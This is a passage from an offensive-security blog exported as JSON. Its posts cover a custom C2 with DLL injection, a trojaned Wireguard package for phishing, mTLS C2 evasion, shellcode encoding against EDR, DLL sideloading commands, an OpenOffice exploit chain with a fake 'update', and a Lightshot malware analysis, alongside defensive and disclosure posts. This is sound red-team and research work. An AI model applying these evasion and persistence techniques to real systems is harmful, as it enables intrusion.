front of it to keep prying eyes away.Final Thoughts&nbsp;&nbsp;&nbsp; There are some issues that are caused by our use of ctypes here. Microsoft identifies this as malicious right away. Then, a lot of EDR vendors will pickup on the CreateRemoteThread flag that we use heavily in the DLL injection portions. VirtualAllocEx will also stand out to a lot of EDR tools but mainly when you allocate memory with read/write/execute permissions and that's never a good idea. What we've done here is allocate the memory with read/write and then we create a new&nbsp; thread with an entry point to the LoadLibrary function that then points to our DLL. Despite all this, this goes undetected by a fair amount of vendors on Virustotal which isn't too surprising to see. SentinelOne, Microsoft, and Elastic are top of the field when it comes to identifying new and emerging threats.&nbsp;&nbsp;&nbsp; Making your own C2 is a lot of fun and there's a ton of learning that comes with it along the way. You have to address how to hide commands being run, how to exfiltrate information, and how deal with commands being fetched. I had played with Empire and Metasploit previously but had not delved into how they handle multiple compromised endpoints too much, so this was a fun opportunity to solve this problem on my own. There were roadblocks with features that should have been implemented, mainly process injection. It would have been nice to get this implemented but if you're going to use ctypes that much, you may as well just use C. It wasn't showcased here either, but handling multiple compromised endpoints is as simple as changing the URL each beacon checks into before compiling into an EXE.&nbsp;&nbsp; &nbsp;" }, { "title": "Sometimes Projects Don't Pan Out", "url": "/posts/sometimes-projects-dont-pan-out/", "categories": "", "tags": "", "date": "2022-03-23 15:54:00 +0000", "snippet": "&nbsp;When things just don't workIt's been maddening. I had this great idea where I would download the Wireguard deb file, modify it to have some pre-configured commands that run after installation...", "content": "&nbsp;When things just don't workIt's been maddening. I had this great idea where I would download the Wireguard deb file, modify it to have some pre-configured commands that run after installation which would connect it to my command and control server, and then have the beacon launch to reach out over this VPN tunnel Wireguard made. I would repackage it and send it off to some dev as a phishing exercise. It was going to work great, the end user would be blind to it apart from a random Wireguard interface they would see and some running processes. But it was a lot more difficult than I imagined to automate this.What did work?&nbsp;&nbsp; &nbsp;Let's quickly go over what did work for this. Wireguard makes it so easy and fast to make a VPN tunnel between two servers. In less than 10 commands on each endpoint, we can have a working private tunnel that is really well encrypted and is blazing fast. There is almost no noticeable latency compared to something like OpenVPN. &nbsp;&nbsp; &nbsp;The quickstart guide available made this so simple to do and it had all the commands you would need. Getting this running through the postinst script located in the deb file was fairly easy. &nbsp;&nbsp;&nbsp; Then, you ship the private key and reverse shell inside the usr directory and, after installation, our postinst script generates the pubkey consistently and finishes the rest of our setup before running the reverse shell. &nbsp;&nbsp;&nbsp; One specific configuration point you need ahead of time is knowing the other ends IP. This is fine for your beacon, your C2 IP probably doesn't change often. But your C2 needs to know your beacons public IP ahead of time before you try to set the bridge up. This was the primary pain point I ran into when trying to automate it all through a shell script.Where I got hung up There were a few methods I played around with for determining the IP of the host. I could curl ipchicken.com and then send that either encoded or encrypted in some manner over the network. This though would raise a lot of flags in the SIEM since I was using a CLI tool to determine my public IP. I could try to map each public IP that the company had on record, but this would get messy very fast and wasn't guaranteed at all to work. I wanted to do everything I could to prevent the beacon from reaching out to my C2 before the VPN was established. I also wanted to keep this all packaged up inside the deb file. I could make a chron job scheduled task for the beacon to launch an hour after installation of the main package and send off the public IP immediately, automate the C2 to collect these IPs and associated public keys, and then create a channel with them. But this would fail on our goal of not communicating outside of the VPN and it would leave a very traceable event in the chron job. It was at this point I decided to table this for now and look at other methods. I don't think this is necessarily a bad idea. There's quite a bit of potential here for something in the future and it's worth keeping in mind when thinking of new ways to get footholds on servers. For now though, this is on hold." }, { "title": "CVE-2021-3919: Using HP Omen Gaming Center Offensively", "url": "/posts/using-hp-omen-gaming-center-offensively/", "categories": "", "tags": "", "date": "2022-01-18 14:55:00 +0000", "snippet": "Background:HP OMEN allowed any user who launched OMEN Gaming Hub version 11.9.4.0 to block outbound network traffic. This action required no UAC and could be abused by unprivileged users to block E...", "content": "Background:HP OMEN allowed any user who launched OMEN Gaming Hub version 11.9.4.0 to block outbound network traffic. This action required no UAC and could be abused by unprivileged users to block EDR tools and AV software from reporting and using online scanning functionality, affecting any user logged in.As illustrated in the below screenshot, a user is able to turn off Sophos Home network features.&nbsp;HP recognized this as an issue and assigned it a CVSS of 6.5 and a CVE on January 18th 2022. Timeline:Sept 27 2021 I alerted HP's product security team about this and was assigned an internal ticket number Oct 4th.&nbsp;Oct 21 2021 I received an update from their team and they let me know that this was determined to be a normal function of the software that had been there for years so this won't be viewed as a security vulnerability.Oct 21 2021 I responded disagreeing with this and asked for it to be re-reviewed.Oct 28 2021 HP acknowledged this as a vulnerability and I told them I plan on releasing 90 days from this notice unless they wanted longer.&nbsp;Jan 10 2022 HP let me know that this was assigned a CVSS of 6.5 and asked that we have a coordinated release on January 18th 2022." }, { "title": "Browser Password Safes", "url": "/posts/browser-password-safes/", "categories": "", "tags": "", "date": "2022-01-01 16:27:00 +0000", "snippet": "&nbsp;How Safe Are They?&nbsp;&nbsp; &nbsp;I wanted to talk briefly about this as a lot of people don't believe browsers have strong password safes, that they can be retrieved in plaintext far easi...", "content": "&nbsp;How Safe Are They?&nbsp;&nbsp; &nbsp;I wanted to talk briefly about this as a lot of people don't believe browsers have strong password safes, that they can be retrieved in plaintext far easier than something like KeePass could, and that you're essentially giving away your passwords if there's ever a browser attack that lets bad actors steal files.How does Firefox store passwords?&nbsp;&nbsp;&nbsp; Let's check out Firefox. Firefox stores passwords in two files according to their documentation. That is the key4.db file and the logins.json file. The logins file contains a list of encrypted usernames and encrypted passwords along with the url they correspond to and some other details like time created and time last used. The encryption of the details is done with an AES-256-GCM cipher, according to this Firefox update from 2019. &nbsp;&nbsp; &nbsp;AES-256 is a tried and trusted format that is regarded as quantum resistant. Grover's algorithm will only reduce symmetric key algorithms by half their strength as opposed to asymmetric algorithms which get destroyed entirely by Shor. So AES-256 goes down to 128 - which is still relatively secure. &nbsp;&nbsp;&nbsp; Before we get into some math, let's take a brief moment to review. GCM is an authenticated encryption mode of operation. It takes a key, unique IV, data to be processed with only the authentication, and data to be both processed with both authentication and encryption. It outputs the encrypted data of part 4 and an authentication TAG. The TAG is used to to verify that the encrypted data or associated data has not been tampered with. AES uses GCM so as to to get better overall performance as compared to CBC since CBC cannot run in parallel. With GCM, each block is conceptualized and encrypted with AES in parallel. AES-GCM is known as an AEAD form of encryption. This means that it simultaneously assures both the confidentiality and authenticity of the data. A common attack on AES-GCM is message forgery given a reused nonce, and this is called the forbidden-attack.&nbsp;&nbsp;&nbsp; &nbsp;Here's a quick example from the link, math courtesy of ashutosh1206. Take message g1, encrypted using g1(X) = C1,1X2 + L1X + S and message g2 encrypted the same way, g2(X) = C2,1X2 + L2X + S. L = len(A) || len(C) where A is the associated message (recall this from our GCM review?) and C is the ciphertext. S is our nonce value and, since each message uses the same nonce, the S values will be the same. The above polynomials cannot be solved without first removing S from them. Since we know that g1(H) = T (H is the authentication key and T is the authentication tag which includes the nonce value (S) in it), we can add T to both equations and then add the two polynomials together. Doing so, we get f(X) = (C1,1+C2,1)X2 + (L1 + L2)X + (T1 + T2) and solving this quadratic equation gives all possible values of H, which we can then use to generate new and valid authentication tags and decrypt past data with.&nbsp;&nbsp; &nbsp;Looking further at Firefox's implementation they, to the best of my knowledge, follow the RFC for AES-GCM so they don't use repeating nonce/IV values. Given this, attacking the implementation of encryption is impractical. &nbsp;&nbsp;&nbsp; Moving onto other vectors, we can take a look inside key4.db which gives us two tables. &nbsp;&nbsp; &nbsp;The first is meta data and yields us two rows and columns. For the \"password\" row, one column is for the salt and the other is for the ASN.1, which just stands for Abstract Syntax Notation 1. We'll need this for analyzing the data in the next table, nssPrivate, which holds our master key.&nbsp;&nbsp;&nbsp;&nbsp; nssPrivate has a ton of columns and each has one row. Inside a11, we can find the master key used for decrypting the rest of the data in logins.json and which the tools we'll look at below automate extracting. One way or another, each of these tools uses the salt and ASN.1 to format and retrieve the key value in a11 row[0] and uses this to decrypt the information seen in logins.json.What tools are there to dump this information?&nbsp;&nbsp; &nbsp;There's a couple of tools like Dumpzilla and firefox_decrypt.py. Dumpzilla doesn't work anymore because it requires the signons.sqlite file, which is no longer used. Ah, but firefox_decrypt.py also looks at the logins.json file! If we run this on the logins.json file alongside the key4.db, and there is no master password set, we get back the passwords stored. But if a master password is set, there's no bruteforce functionality and the program fails.&nbsp;&nbsp;&nbsp;&nbsp; A lot of tools try to primarily use Firefox's NSS library - which stands for simply Network Security Services. But one tool, firepwd, uses none of that and does it all their own way. So props to them for doing a custom implementation.&nbsp;What about KeePass?&nbsp;&nbsp;&nbsp; Keepass is very forthcoming about how they secure your information. In 2.x versions, you get the option of AES or ChaCha20, both with 256 bit key sizes. AES is much more commonly seen than ChaCha20 so out of the two, let's check out ChaCha.&nbsp;&nbsp;&nbsp; ChaCha20 is the successor to Salsa20. It's been adopted by Google as the defacto encryption scheme for their QUIC protocol and KeePass uses it in conjunction with CBC and HMAC-SHA-256 to ensure the datas' authenticity and integrity. This has the drawback though of being slow, which is why TLS has moved to ChaCha20-Poly1305. In something like a password safe though this slowness would be negligible as you only have to enter your password once to open up the safe. You're not doing repeated encryption operations thousands of times a second, it's only one, so normal users will never experience this. This could affect attackers though who trying to brute-force the master password. What will also affect attackers is KeePass' option to use Argon2 for the KDF. This function has resistance against GPU and ASIC attacks built into it through increased RAM and CPU costs which makes it harder to derive a valid key without knowing the password. The use of HAMC-SHA-256 to provide authentication is a move to prevent chosen-ciphertext attacks. This method is called encrypt-then-MAC and allows the decryptor to check the message authentication code before they decrypt the message. If the MAC isn't valid, no decryption occurs. The combination of a slow encryption scheme through CBC, using Argon2 for a KDF, and hashing with HMAC-SHA-256 seems like a very strong approach to dissuade brute-forcing and oracle attacks.&nbsp;&nbsp;&nbsp; &nbsp;Overall, KeePass has very strong encryption and does a great job at protecting their users. I do wish that Argon2 was the default, but regardless attacking it is impractical. There are more things they do to protect user information that I haven't covered in this portion, like their secure desktop and in memory encryption, so read their full write up if you would like additional details.What tools are there to dump KeePass kdbx files?&nbsp;&nbsp; &nbsp;None. KeePass requires a master password by default so is not susceptible to the same attack that Firefox is.How do they compare?&nbsp;&nbsp;&nbsp; If you set a master password in Firefox then no one will be able to retrieve your passwords except for those with that master key. The encryption chosen is as good as other desktop based password safes. Yes, without a master password set, Firefoxs database can be retrieved and information stolen trivially. But if you take one moment to setup a password, then you foil the attackers. Some may be wondering \"What about Chrome?\" Well Chrome secures your safe with your Windows session making it trivial for an attacker to read it if you're logged in." }, { "title": "Detecting When Someone Isnt Who They Say They Are", "url": "/posts/detecting-when-someone-isnt-who-they/", "categories": "", "tags": "", "date": "2021-12-23 00:57:00 +0000", "snippet": "Using PowerShell To Find Fraudulent DLLsWe've talked a lot on here about offensive stuff as of late, so let's shift gears and think about some methods for detecting what we've done. In the image be...", "content": "Using PowerShell To Find Fraudulent DLLsWe've talked a lot on here about offensive stuff as of late, so let's shift gears and think about some methods for detecting what we've done. In the image below we have a real and a fake DLL. Looking at the file details it's pretty easy to spot which one is the original.In the supposed \"libcurl.dll\" we can see a lot of file details are missing. This is a good jumping off point to start working on how to detect and identify files similar to these. One quick point, I wanted to not rely on the Digital Signatures file portion primarily because legitimate files can often come without this. At first I wanted to use Yara but Yaras strong point is detecting when strings DO exist, less so when they don't. So I moved onto Powershell.And as you can see above, it's a lot easier and gives us what we want in a nicely formatted list. So now what we need out of this is to recursively run on a directory which we can add with $Env:USERPROFILE\\Desktop in place of the file name, and we need to filter on the VersionInfo parameters to see if they're empty. Also not super difficult with the -property flag.Hhhmmm, now which one is the real libcurl... And there we go, we can get some quick file information from a directory and check for programs missing key publisher information. This won't catch sophisticated attackers, but you may find some interesting files worth investigating further this way. " }, { "title": "Lessons In C2 From The CIA", "url": "/posts/lessons-in-c2-from-cia/", "categories": "", "tags": "", "date": "2021-11-30 16:22:00 +0000", "snippet": "IntroI've always wanted to make my own C2 framework but have never really found the inspiration to, until I came across a post from Byt3bl33d3r talking about modernizing the CIA's C2 framework. Thi...", "content": "IntroI've always wanted to make my own C2 framework but have never really found the inspiration to, until I came across a post from Byt3bl33d3r talking about modernizing the CIA's C2 framework. This was somehow the first time I had come across a paper regarding Switchblade and Hive and I wanted to try and set up a mock version for myself.A Quick Review Of mTLSBefore getting into the gritty details of this, let's review/introduce mTLS. mTLS stands for mutual authentication TLS. This is often implemented in zero-trust environments so that the client knows the server is who they say they are and vice-versa. Where a server normally only presents its certificate to connecting clients and then completes connections, mTLS adds the extra step of the client presenting their certificate so that the server can then verify them. The CIA developed Switchblade to use mTLS to authenticate beacon requests to the C2 server and send everyone else to a fake cover site. It can be seen in the diagram below taken from the Vault 7 leaks.How Can We Leverage This?I haven't seen a FOSS C2 framework specifically utilizing mTLS yet. There have been quite a few using HTTPS and that's fantastic, but it's always fun to take things one step further. In an engagement, when an analyst examines unusual traffic from workstations, forwarding those unauthenticated queries from them to something like google.com provides a minor level of credibility. Taking that further, you could even host your operations in the Google cloud so when they examine the IP it shows up as being owned by Google. This provides far more cover then returning a server error and sort of allows one to hide in plain sight.&nbsp;Now into the details of the project.Generating certs&nbsp;It took me a little bit to figure out how to properly generate certs for mTLS that work well with our transparent proxy configuration until I came across this resource. I recommend following along with what they have written as it works flawlessly. Just ensure that your CN name matches up with the server name you'll be routing to, otherwise you'll encounter errors.Nginx confThe config for Nginx goes into /etc/nginx/conf.d/ and can be found here. There's nothing super fancy here, it's primarily the one leaked from the CIA and it uses an if statement to check the supplied certificates. If it fails, the client is transparently redirected to the cover site. We did add a few lines specifically that nginx documents as needed for facilitating websockets, but that's it. People familiar with nginx will notice that the websocket upgrade arguments are outside of where they should go according to documentation, but this was how it worked without errors and, while troubleshooting this, I noticed that CIA also had it setup this way.Back-end serverFor the server, it started as a Node project that nginx uses in their example documentation for websockets. A client connects and checks in with a simple \"hello\" and then the server fires off a response. After the client check in, they are appended to an array and logged. This has it's shortcomings. Only one client seems to be able to stay connected at a time so we need a better solution. Thankfully, Node is super popular and I found someone who was handling multiple websockets very quickly! Find this here.ClientPython makes a fantastic test bed to get this up and running super quickly. Super quick might be a reach because the amount written on websockets and mTLS in Python is very sparse compared to other areas. But we're getting ahead of ourselves.&nbsp;Before this, I should talk about what was tried and what failed. This started with doing web requests through Python to a back-end web server, with nginx routing it based off of certificates supplied or not. Which worked fine, the web requests were all routed correctly and they retrieved the page, but there was a hitch. This isn't an ideal solution in any way because the HTTP protocol is unidirectional and operates on a request response method. Once data is finished being sent, the connection is closed. Passing commands over GET requests is finicky and not very dynamic.&nbsp; I next turned to sockets. Sockets are fantastic but fall just short of the mark here because, with the nginx configuration, I was able to send HTTP GET requests but was not able to get a socket to communicate back and forth through this transparent proxy.What's the solution? Websockets. Nginx out of the box actually supports these really well and we can even see the CIA implementing the start of one in the example configuration leaked. Websockets big advantage is that they allow for bidirectional communication and they work easily with the transparent proxy.Find the code for this here. For my example I smashed two projects together from here and here. The interaction between the client and server looks like this.Update: We've got an interactive shell now!Client in alternative languagesAlongside creating the Python client/server, I also wanted something which could more traditionally be compiled into an executable. We have a few candidates we can look at for this, I'm thinking Go or C#. Both languages are well documented, memory safe, and have very strong built in libraries. Unfortunately, I'm not super familiar with developing apps in either, so this will be an adventure. Expect more on this soon.Following the CIA's recommendationsSince this is the CIA's general idea for command and control infrastructure, we might as well follow their recommendations for the implant. The CIA, alongside creating Switchblade, have a number of dos/donts for creating malware so as to avoid attribution and detection. These are great tips in general to make detection more difficult which is important in red team engagements. We've got to make sure our beacon traffic can't be replayed, the traffic is encrypted on the wire, the executable leaves a small footprint and is under 150kb, and that we obfuscate or encrypt any sensitive strings internally. There are others, but this is just a baseline. Right off the bat, we're not going to be able to keep any compiled Python based executable under 1000kb, let alone 150kb, so we'll have to look at other languages for that. We have ensured though that communication between the beacon and the server is encrypted and it can't be replayed either. This leaves sensitive strings, which certs could fall under. In my beacon example, I just pass the directory and file to read from. But in a deployable version, you will want to incorporate these into the program. In Python, this is a little tricky as the sslSettings.load_cert_chain takes a cert file, not a variable with the cert as a string. So if you wanted to deploy this, you would need to deploy the cert file alongside - which is honestly an annoying short coming. How big of a deal this is depends on you. In Windows, we can add the certs to the cert chain and go from there, but the point is that we need to drop more than one file to make this work and you'll be expanding your footprint.ConclusionThis was a pretty challenging project for me personally but I'm happy that I got the bare bones of it working the way I envisioned. I really want to get the PE version of the beacon setup so that I can do a mock red team exercise with a couple of Windows servers, server 2019 DC's, an ELK Security stack, and good ol' Windows Defender, but that's for the future. I think this provides a good base to build off of. If we look at a packet capture of this on the wire, we can see all the transmitted data is encrypted. Additionally, nothing can be replayed to the C2 server.I'm annoyed that I can't seem to find a way around dropping multiple certificates on the host, and yeah they can be hidden, but it's increasing the footprint we leave which increases the risk you have of being discovered. I believe the certificates required is the reason you don't often see this deployed out of specific circumstances. I hope to continue working on the client/server architecture for this so expect more in the future." }, { "title": "Custom Encoding For Shellcode", "url": "/posts/custom-encoding-for-shellcode/", "categories": "", "tags": "", "date": "2021-11-03 01:22:00 +0000", "snippet": "Tired of your payloads constantly getting detected? Tried MSFVenom and still have had no luck with making it past EDR?&nbsp;Then read on for to how to make your own encoder.Preface: Before we get i...", "content": "Tired of your payloads constantly getting detected? Tried MSFVenom and still have had no luck with making it past EDR?&nbsp;Then read on for to how to make your own encoder.Preface: Before we get into the weeds, I have to credit the project that this was heavily based on by ired.team. It can be found by following the hyperlink. I took it one step further by combining it into one Windows based script and showing applications as well as analyzing the detection's.Now onto the fun:The code for the project can be found here. One should have familiarity with Powershell and hex while working through this. Knowledge of assembly isn't required, but things will make more sense with it. ired.team should be credited for heavily for all of this, but especially for commenting the assembly file, it helps a lot with understand it.The first step is to encode our hex payload. For this we will use Powershell. We run through the hex encoded string and XOR it, add to it, and then XOR it again, before returning the new encoded string.Running this returns our new encoded string and the size of it.&nbsp; The size is needed for our assembly to properly know how many bytes to process.With the size and newly encoded shellcode, we can then move on to our assembly file.&nbsp;This is a quick assembly file that loops through our encoding scheme in reverse. The math operations happen in reverse of what we use in our encoding scheme because we want to generate instructions for undoing it. This way, when we compile our code, we get back the encoded shellcode as well as the assembly operations for decoding it. We can run it through nasm nasm -f win64 .\\decode.asm -o Decode and examine the output in CFF Explorer. This looks like below. The highlighted section starts at EB 1E and, you might notice, ends at the last character of our payload, 3F 20. This blocks includes our decode scheme and our encoded payload. So when we load the payload into an application, it knows how to decode it as shown below. The encoded version is on the left and the decoded is on the right.Applying what we've done:With this shellcode, we can insert it into an application using something like Frampton.&nbsp; Frampton is a tool to insert shellcode into code caves within applications. Code caves are a whole different topic to get into but the long and short of it is that after compiling programs there's empty space left over. This space can be filled with our code that's either pointing to an external resource or by finding a cave large enough to fit our whole payload. Once Frampton finds and inserts into this code cave, it changes the execution point to start where our cave is filled, and works from there.&nbsp; It's not super elegant because we're not controlling where the code cave is, it makes file sections that are normally not executable now executable, and the application flow doesn't work as you might normally expect afterwards. Because the PE has a new entry point outside of the .text section, which is normally the only executable section of a file, AV has a higher chance of flagging it as malicious.&nbsp; Analyzing detection:We've inserted our encoded shellcode into an application and made it executable. So what does the Virustotal detection look like?&nbsp;Just about all the vendors are detecting the invalid signature in PuTTY now since we've changed the file and the remaining vendors are detecting the unusual entry point. Compare this with the detection of the same payload encoded using Shikata Ga Nai. We can see a big jump in detections as well as some vendors identifying the specific encoding scheme used." }, { "title": "Can You Tell Real From Fake: Lightshot Malware Campaign", "url": "/posts/can-you-tell-real-from-fake-new/", "categories": "", "tags": "", "date": "2021-10-28 20:34:00 +0000", "snippet": "Background:Lightshot is a utility for Windows and Macs that allows you to take screenshots of select portions of your screen. It's handy if you don't want to use the built in Windows function which...", "content": "Background:Lightshot is a utility for Windows and Macs that allows you to take screenshots of select portions of your screen. It's handy if you don't want to use the built in Windows function which is honestly lacking. Personally I recommend Greenshot. How the campaign works:Honestly, this is well put together. The attackers paid money to get this to be the first result on Google through advertisements. See below:And if you go to the website, I can't blame people for not being able to tell the difference:The image on the right is the fake site, well built to mimic the real one on the left. And if you download the fake version, you actually do get Lightshot installed, but also an old NetSupport client compiled in 2009:Examining the installer:If we take a look at the installer in PEStudio, we can see a number of red flags. First, the code was compiled in 2050 - why this is a red flag is self explanatory. Next, it has 0 imports. This suggests that files are imported at run time in order to make static analysis more difficult. Also, the file has a reference to a URL which we'll see utilized below to send some initial information. Finally, the PE has unusually high entropy which indicates that it has packed data.What the malware does:&nbsp;When you launch the installer, Lightshot sends out a POST containing your private IP:Once you have Lightshot installed on your PC, a number of actions follow. First, you'll notice that Net Support is installed under C:\\Users\\Public\\support, which is a common location for files trying to hide. Then you have a new registry key created for persistence with support.exe:Then, Support.exe starts attempting to phone home:After phoning home, the attack becomes hands-on-keyboard. Support.exe receives a remote connection from the attacker and a DLL is copied over. Then through remcmdstub.exe, NetSupports tool for running commands, this is run: remcmdstub.exe 1992 1804 2000 2004 %COMSPEC% &amp; remcmdstub.exe 1992 1804 2000 2004 %COMSPEC%Which spawns: \"C:\\Windows\\System32\\rundll32.exe\" \"c:\\Intel\\6789341.dll\" &nbsp;This DLL that is attempted to run is a Cobaltstrike beacon. Once ran, antivirus flagged it and stopped it from executing further, and the DLL was subsequently deleted.Wrapping up:It's hard for average users to stay abreast of this type of campaign when the attackers do such a good job mimicking the real site and installer, not to mention the installer is signed and verified so Windows won't throw any errors. This is made even more so when they buy ad space that manages to come before the legitimate site in searches. It's important to remember to check the URL, in this case the giveaway being the extra \"n\" in the URL, as this the least you can do to keep yourself protected. Up to date antivirus is also evidently important since it will stop beacons from reaching out and further compromising the system. Watching for foreign IP's can only do so much as the ones in this case were a mix of Asian and American systems. This also isn't the first time something like this has happened. IOC:66.29.138[.]19103.159.132[.]236&nbsp;http://transferdataflows[.]com/updscrc.php&nbsp; ad49c28159f0d5a6e974e5e55518357196583dac6751cb31f2328739b326a30c - setup-lightshot275e5b085534f64313b50cbdcb08ecd59c57d21c96bb937f140ee92a3d27f792 - NetSupport/client32 41c6ffc32baad42ccc8ffd3c17e74c30fccc401bd0c65f22a63fec1cd5e5a192 - DLL&nbsp;" }, { "title": "DLL Hijacking", "url": "/posts/dll-hijacking/", "categories": "", "tags": "", "date": "2021-10-24 20:16:00 +0000", "snippet": "What is DLL hijacking?DLL hijacking is an adversarial technique for exploiting trusted applications in order to load malicious code. There are many more advanced techniques than what I will display...", "content": "What is DLL hijacking?DLL hijacking is an adversarial technique for exploiting trusted applications in order to load malicious code. There are many more advanced techniques than what I will display here such as stack walking, export table cloning, and run time table reconstruction. To learn more about those, check out this blog. This technique is the quickest I've found for getting a payload included into a trusted application for use at run time.Checking what DLL's an application usesFor this we can use Procmon - a tool from Windows. It's perfect for our use case.We want to filter for only DLLs that aren't being loaded from C:\\Windows or C:\\Program Files and that are from user-land accessible folders, and filter out everything else.Once we have this setup and our results filtered, we can look for two things. An application not able to find a DLL, or an application successfully loading a DLL out of its own folder. I find the latter to be the easier method, as with the former you have to ensure that replacing the DLL with your own doesn't interrupt application flow, which is hard.Hijacking the search order flowWhen we find an application to target, we can attack the DLL search implementation. Windows searches for DLLs in a specific order, which is as follows:If the module is not already loaded or on the list of known DLLs, the system searches these locations in this order:The package dependency graph of the process. This is the application's package plus any dependencies specified as &lt;PackageDependency&gt; in the &lt;Dependencies&gt; section of the application's package manifest. Dependencies are searched in the order they appear in the manifest.The directory the calling process was loaded from.The system directory (%SystemRoot%\\system32).Knowing this helps us narrow down the potential applications to target. We want a DLL not already loaded into memory and one that doesn't appear in the package dependency graph. With this in mind, we begin searching. Below is a good example of NP++ not able to find a file it's looking for. It's searching the local folder to not avail.If we were to place the real MSIMG32.dll in there, NP++ would see it and load it fine. But if we were to put our payload in there and rename it to the expected file name, NP++ would attempt to read it and then, most likely, encounter an error and not launch properly. Which leads us to our next method!DLL Side-loadingDLL Side-loading is a lot less interrupting to the application in question. In the screenshot below, it can be seen that NP++ is loading a legitimate DLL it needs for updating. So let's mess with it and see what it takes to break.I found the easiest way to do this was with a tool called DLLsideloader. This tool allows us to not interrupt the normal flow of the application, letting it continue working as intended while also loading our payload. To use it, there's two commands:. ./DLLSideloader.ps1 Invoke-DLLSideLoad legit.dll payload.dllCopying the DLL that we found, libcurl.dll, into the same folder as DLLSideloader, we launch the script and let it run. This then outputs two files, a new \"legit.dll\" file and a temp file. In my case, these are libcurl.dll and tmpD1F3.dll.You'll notice the new libcurl.dll is smaller than the real version, libcurl.dll.bak, and that's because this file contains a pointer to our payload as well as a pointer to the temp file created. When libcurl.dll is ran, the payload is executed and then the flow passes onto the legitimate dll which has been renamed to the temp file. This way, there should be no service interruption. We now want to copy all three files above over to the folder where we took the original DLL out of. Once done, if we look back at Procmon and close and reopen NP++, we can see that the file is being read and functionality hasn't been impacted.&nbsp;Additionally, now our DLL has executed its payload.&nbsp;&nbsp;Sometimes though, despite matching all of our criteria and our best effort, an application implements proper checks for the fake DLLs being loaded which looks like below:&nbsp;In this case, it's best to move on to a different file/folder and try again." }, { "title": "CVE-2020-13958 Full Kill Chain", "url": "/posts/cve-2020-13958-full-kill-chain/", "categories": "", "tags": "", "date": "2021-09-21 20:35:00 +0000", "snippet": "CVE-2020-13958 - BreakdownIn the simplest of terms, CVE-2020-13958 is an issue with OpenOffice where, upon opening specially crafted documents, a program or webpage can be opened with no user inter...", "content": "CVE-2020-13958 - BreakdownIn the simplest of terms, CVE-2020-13958 is an issue with OpenOffice where, upon opening specially crafted documents, a program or webpage can be opened with no user interaction required. PoCI will use the original authors words to explain it because they explain it best:The problem is, the product does not handle script:event-listener handlers as macro execution (like LibreOffice does). Using a construct like this:&lt;office:scripts&gt; &lt;office:event-listeners&gt; &lt;script:event-listener script:language=\"ooo:script\"xlink:href=\".uno:OpenHyperlinkOnCursor\" script:event-name=\"dom:load\"/&gt; &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;One can trigger opening URLs without any confirmation dialogs in OpenOffice, including special .uno or .service link handlers that were designed for internal use only.&nbsp;An illustration of the hyperlink issue can be seen below:As shown, it uses file:/// to open an executable as soon as the document is opened. But this alone isn't enough to cause major issues, there has to be a malicious file already on the PC for this to work well. Can we chain two commands together in the file path, such as calling cmd.exe and then passing a string to it? Looks like the answer to this is a resounding \"No.\"&nbsp;What about downloading a file and then opening it? Well it opens the first hyperlink fine, but can't run the executable afterwards. OpenOffice seems to only run the first hyperlink regardless of what's in the second one, such as another download link. That's another \"No.\"So how can we change this slightly to work better?Chaining with a macroThis is where chaining it with a macro comes in. We can change the original idea a little and, instead of opening an executable on the persons computer, we can open a weblink and automatically trigger a download for a new file, maybe an \"update\" for OpenOffice - to steal an idea from some common Microsoft Office malware.&nbsp;We will change the URL to, instead of a local file, automatically bring us to a download page for an \"update\" for OpenOffice. And then add a macro to run:&nbsp;And then set it to run on document close:Now when the document is opened it redirects to another webpage that prompts the user to download an \"update\" and then, on document close, the exe we downloaded runs. This takes a little bit of tricking the user to work properly, we have to make them believe that when the document is opened their version of OpenOffice is out of date, prompting them to allow the download through. Then once the download is complete and the document closes, smartscreen will stop the file from running without a user clicking yes, but even without a signing cert a good amount of users will click \"More info\" -&gt; then \"yes\" to allow the exe to run." }, { "title": "Defeating Defender", "url": "/posts/defeating-defender/", "categories": "", "tags": "", "date": "2021-08-25 00:00:00 +0000", "snippet": "Causing issues with compilation", "content": "Causing issues with compilation" }, { "title": "Examining Python Malware And AV Detection", "url": "/posts/examining-python-malware/", "categories": "", "tags": "", "date": "2021-07-21 22:17:00 +0000", "snippet": "What does Python malware look like?It comes in many flavorsPython malware has recently taken off because of its ease of development and deployment. Due to it's simple nature, it's easy to do many d...", "content": "What does Python malware look like?It comes in many flavorsPython malware has recently taken off because of its ease of development and deployment. Due to it's simple nature, it's easy to do many different things. The example below is what could be considered ransomware, it targets an arbitrary folder and turns it into an encrypted zip. It also leaves the old folder behind but real ransomware won't do this. When we turn the Python PE file into Python byte code using pyinstxtractor.py then examine that byte code with uncompyle6, we can see a few different instructions off the bat that should indicate this could be ransomware. Things like AES, encryption, zipping files, and setting a password all should raise flags in modern AV.What does detection for this look like?But, as illustrated below, this file isn't flagged for detection by a majority of AV. Defender correctly categorizes this as a Win32/Wacapew.C!ml which indicates that this program might block access to a users folder.&nbsp;So why hasn't a lot modern AV caught up with this? Evidently AV like Sophos can spot Python malware, as indicated by this VirusTotal sample for SeaDuke, so is their threshold just too low? When downloading this on a Defender protected system using Brave, i.e. not using a Defender protected browser, Defender still performs a code analysis on the file and correctly identifies it as malicious. This is something that Sophos business didn't even do or flag, let alone their Home product. Looking at Sophos Home features, they analyze for known threats using signature detection and offer predictive AI threat detection to try and identify new and novel threats in the wild. You have to pay for things like advanced real time protection or ransomware protection, something every vendor should be offering on their base product, and you have to wonder if this is part of the racket of incentivizing people to pay to upgrade to something that'll actually protect you.&nbsp;To really emphasize how much Sophos is letting down its user base, I wrote a quick YARA rule based on what I saw in the hex analysis of one of the PE's I had made.Utilizing that YARA rule is a Python script to analyze a PE file in my downloads, detect if it is a Python PE file based off what is in the compiled binary, then convert it to Python byte code and analyze that for elements that'd indicate if it was doing something malicious.I wrote this in a couple hours. And Sophos doesn't seem to want to roll this out to their paying users even." }, { "title": "Is Windows Defender Up To Par?", "url": "/posts/is-windows-defender-up-to-par/", "categories": "", "tags": "", "date": "2021-07-20 02:53:00 +0000", "snippet": "How Effective Is Defender?Short answer: Effective EnoughLong answer: Read onTesting Methodology:&nbsp;&nbsp; &nbsp;I have a bunch of random malware samples on my PC ranging from Mimikatz to ransomw...", "content": "How Effective Is Defender?Short answer: Effective EnoughLong answer: Read onTesting Methodology:&nbsp;&nbsp; &nbsp;I have a bunch of random malware samples on my PC ranging from Mimikatz to ransomware so we have a lot to work with! I'm going to be testing initially with Sophos vs Defender and our first test is to download Windows 10, boot up a VM, and see if we can download the renamed Mimikatz exe. As seen below, this was immediately flagged. &nbsp;&nbsp; &nbsp;Not only was the exe flagged, so was the zip file. So let's try renaming everything in the source, removing Mimikatz, Powerkatz, all the 